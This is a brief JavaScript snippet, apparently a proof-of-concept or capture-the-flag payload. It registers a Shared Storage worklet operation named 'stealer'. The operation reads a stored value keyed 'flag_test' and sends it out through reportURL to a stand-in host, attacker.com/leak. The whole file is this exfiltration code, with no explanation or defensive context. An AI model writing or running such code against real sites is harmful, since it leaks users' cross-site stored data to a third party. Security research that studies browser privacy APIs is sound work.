class StealerOperation {
  async run(urlParams, data, reporter) {
    const value = await sharedStorage.get("flag_test");
    reporter.reportURL("https://attacker.com/leak?val=" + value);
  }
}
register("stealer", StealerOperation);
